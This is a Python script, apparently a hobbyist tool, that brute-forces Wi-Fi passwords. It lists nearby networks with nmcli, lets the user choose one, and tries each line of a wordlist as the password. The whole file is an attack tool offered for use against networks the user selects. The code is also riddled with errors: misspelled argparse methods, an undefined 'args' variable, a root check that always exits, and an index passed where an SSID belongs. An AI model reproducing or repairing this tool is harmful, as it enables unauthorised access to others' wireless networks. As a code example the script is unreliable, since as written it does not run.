#Simple-Brute-Wifi
#LINUX ONLY -- REQUIRES NMCLI
'''
This is a simple brute force tool for Wifi-Hacking. It is meant to be used with a wordlist file as the bank of attempts.
Included in this script is the option to make it only usable by sudoers
'''
import os 
import subprocess
import sys
import time 
import argparse

# Add switches: Verbose and file. No help tabs, for usage should be obvious (file requires a path)
# Verbose will show the used password from that file
def argument_parser():
    parser = argparse.AgrumentParser( prog="brute-wifi", description="brute force wifi from file (python)")
    parser.add_argument('-f', '--file', type=str, default=None)
    parser.add_agrument('-v', '--verbose', action= 'store_true')
    return parser.parse_agrs()

#Please change the first 1 to a 0, in the or statement, if you wish for this script only to be run by sudoers (root)
def root_check():
    root_check = os.popen("whoami").read()
    if (root_check.strip() != "root"  or 1==1 ):
        print("Please run as root")
        sys.exit(-1)
        

#If your target network is not known, this function will find all targets as a list of ssids for you to chose from. It relies on nmcli.
 

def find_targets():
    
    #This first section runs nmcli to read the local network. We save the output and..
    networks_raw = subprocess.run(["nmcli", "-f", "SSID", "dev", "wifi"], capture_output = True, text = True).stdout
    networks_split = networks_raw.split("\n")
    network_type_raw = subprocess.run(["nmcli","-f","SECURITY", "dev", 'wifi'],capture_output= True, text = True).stdout
    network_type_split = network_type_raw.split("\n")
    
    #Make it more readable here. We want to return the networks and security types as a list of lists 
    networks =[network.split() for network in networks_split if (networks.split != "SSID") and (network.split() != "--" and (network.split() != ""))]
    network_types = [net_type.split() for net_type in network_type_split if (net_type.split() != "SECURITY") and (net_type.split() != "")]
    
    ssid = []
    security = []
    
    for i in range(len(networks)):
        if networks[i] not in ssid:
            ssid.append(networks[i])
            security.append(network_types[i])
    
    return [ssid, security]

# Once we have found the targets, we should be able to list them in a manner that is easy for the User to select from
# They will be printed to the terminal screen in a numbered list: this will allow for the User to simply type a number to select a network 
def display_tagets(ssid, security):
    print("Select a tsrget: \n")
    
    #We should resize the terminal output to ensure proper readablility
    rows, columns = os.popen('stty size', 'r').read().split()
    for i in range(len(ssid)):
        width = len(str(str(i+1) + ". " + ssid[i] + security[i])) + 2 
        spacer = " "
        
        #Resize if too large (we don't want terminal wrapping) 
        if (int(columns) >= 100): 
            space_iterable = range(int((int(columns) - int(width)) * 0.75))
        else:
            space_iterable = range(int(columns) - int(width))
        
        for j in space_iterable:
            spacer += "."
            if j == (space_iterable -1):
                spacer += " "
        
        print(str(i+1) + ". " + ssid[i] + spacer + security[i])
        
#This is a function that allows for the User to select a target
def target_prompt(last_target):
    while True:
        try:
            select = int(input("\nEnter the number next to desired target: "))
            
            if select >= 1 and select <= last_target:
                return select -1
        except Exception:
            print("Nonexistant network. Pick a number between 1 and {}".format(last_target))
            
#This is the brute force function. It reads the file, and tries all its content line by line
def brute_force (selected_network, passwords, agrs):
    for password in passwords:
        #NetworkManager may restart after unsuccessful attempt, thus we should restrip it to make sure 
        password = password.strip()
        
        #We need to make sure the password is at least 8 characters in length. Else, the thrown error will break the logic of the script
        if len(password) < 8:
            if args.verbose is True:
                print("{} skipped".format(password))
            continue
        
        if args.verbose is True:
            print("Attempting with {}".format(password))

        #This is the brute force proper. We will be throwing this into nmcli
        commands = [
            "sudo",
            "nmcli",
            "dev",
            "wifi",
            "connect",
            selected_network,
            "password",
            password
        ]
        
        try:
            subprocess.run(commands, capture_output= True, text = True, check = True)
            sys.exit("Successful: {} was the password".format(password))
        except subprocess.CalledProcessError:
            if args.verbose is True:
                print("Failed attempt: {}".format(password))
    
    #If we exit the for loop, we know all passwords have failed 
    print ("All Passwords fail")
    
#After debugging, the service NetworkManager often needed to be reset. This is the fastest way to do so

def reset_cls():
    os.system('cls' if os.name == 'nt' else 'clear')

#Lastly, this is the main function. We will call it at the end of this script. It pieces together all functions

def main():
    reset_cls()
    root_check()
    args = argument_parser()
    
    #If your file is too large, it may cause an overflow, as it is being open all at once. Their is a way to only load one line at a time,
    #But that sacrafices effeciency (you would need a counter and include the opening and closing of the file in the for loop)
    if args.file is not None:
        file = open(args.file, "r")
        passwords = file.readlines()
        file.close()
        
    targets = find_targets()
    display_tagets(targets[0],targets[1]) #Recall that find_targets returns a list of len 2
    last_target = len(targets[0])
    picked_target = target_prompt(last_target)
    target = picked_target
    
    reset_cls()
    print("\nRunning")
    brute_force(target, passwords, args) 
    
main()
    
    
    
        